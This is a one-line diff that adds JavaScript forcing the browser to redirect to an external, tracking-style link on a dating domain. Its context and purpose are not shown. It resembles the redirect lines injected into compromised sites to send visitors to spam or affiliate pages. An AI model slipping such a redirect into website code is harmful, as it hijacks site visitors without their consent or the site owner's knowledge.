@@ -1,0 +1,1 @@
+window.location.href = "https://t.mbdating.link/133199/7486/0";
